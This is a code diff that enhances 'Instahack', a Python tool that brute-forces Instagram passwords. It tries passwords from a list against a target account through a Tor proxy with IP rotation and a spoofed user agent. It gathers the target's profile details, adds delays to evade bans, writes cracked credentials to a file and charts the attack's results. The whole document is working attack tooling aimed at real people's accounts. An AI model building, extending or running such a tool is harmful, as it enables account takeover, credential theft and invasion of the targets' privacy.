@@ -2,13 +2,19 @@
 import os, sys, time, subprocess
 from instagrapi import Client
 from stem.control import Controller
+import matplotlib.pyplot as plt
 
 SMART_ANTIBAN_ENABLED = True
 DELAY_BASE = 2
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
+
+success_count = 0
+fail_count = 0
+tested_passwords = []
 
 def display_banner():
     print("\n" + "="*60)
-    print("🔒 Instahack — Advanced Instagram Attack Tool")
+    print("🔒 Instahack — Enhanced Edition")
     print("="*60 + "\n")
 
 def change_ip():
@@ -21,9 +27,9 @@ def change_ip():
     except Exception as e:
         print(f"[!] Error changing IP: {e}")
 
-def save_log(username, password):
+def save_log(username, password, status):
     with open('cracked.txt', 'a') as f:
-        f.write(f"{username}:{password}\n")
+        f.write(f"{username}:{password} - {status}\n")
 
 def username_exists(username):
     result = subprocess.run(
@@ -34,23 +40,39 @@ def username_exists(username):
     return result.returncode == 0
 
 def login_with_passwords(username, password_list):
+    global success_count, fail_count, tested_passwords
+
     if not username_exists(username):
         print(f"[✘] User '{username}' does not exist on Instagram. Aborting attack.")
         return False
 
     delay = DELAY_BASE
     failures = 0
+    client = Client()
+    client.set_proxy('socks5h://127.0.0.1:9050')
+    client.set_locale('en_US')
+    client.set_user_agent(USER_AGENT)
+
+    try:
+        info = client.user_info_by_username(username)
+        print(f"[i] Username: {info.username}")
+        print(f"[i] Account Type: {'Private' if info.is_private else 'Public'}")
+        print(f"[i] Followers: {info.follower_count}, Posts: {info.media_count}")
+    except Exception as e:
+        print(f"[!] Could not get user info: {e}")
+
     for pwd in password_list:
         print(f"[+] Trying: {pwd}")
-        client = Client()
-        client.set_proxy('socks5h://127.0.0.1:9050')
+        tested_passwords.append(pwd)
         try:
             client.login(username, pwd)
             print(f"[✔️] Success! Password is: {pwd}")
-            save_log(username, pwd)
+            save_log(username, pwd, "SUCCESS")
+            success_count += 1
             return True
         except Exception as e:
             errmsg = str(e).lower()
+            save_log(username, pwd, "FAILED")
             if 'facebook' in errmsg:
                 print("[!] Account is linked to Facebook login. Skipping this user.")
                 return False
@@ -63,6 +85,7 @@ def login_with_passwords(username, password_list):
                 return False
             else:
                 print(f"[!] Failed: {e}")
+                fail_count += 1
                 failures += 1
             if SMART_ANTIBAN_ENABLED:
                 delay = min(delay + 1, 10) if failures > 3 else delay
@@ -70,7 +93,18 @@ def login_with_passwords(username, password_list):
                 time.sleep(delay)
             else:
                 time.sleep(DELAY_BASE)
+
+    plot_results(username)
     return False
+
+def plot_results(username):
+    labels = ['Success', 'Fail']
+    values = [success_count, fail_count]
+    plt.bar(labels, values)
+    plt.title(f"Attack result on {username}")
+    plt.ylabel("Attempts")
+    plt.savefig("attack_result.png")
+    print("[✓] Result graph saved as attack_result.png")
 
 def gather_osint():
     target = input("Enter username: ")
